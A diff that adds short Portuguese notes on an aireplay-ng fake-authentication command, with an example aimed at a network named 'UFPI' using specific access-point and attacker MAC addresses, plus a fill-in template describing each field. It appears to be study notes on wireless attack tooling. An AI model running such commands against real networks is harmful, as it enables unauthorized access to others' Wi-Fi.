@@ -1,0 +1,14 @@
+
+Exemplo:
+
+#aireplay-ng -1 0 -e UFPI -a 74:A2:E6:EB:CD:30 -h 44:1C:A8:C0:DF:EF wlp6s0
+
+Template:
+
+aireplay-ng -1 0 -e NameNetwork -a zz:zz:zz:zz:zz:zz-h aa:aa:aa:aa:aa:aa Interface
+
+zz:zz:zz:zz:zz:zz - MAC do Acess Point.
+
+aa:aa:aa:aa:aa:aa - MAC do atacante.
+
+Interface: é o nome da sua Interface de Rede.
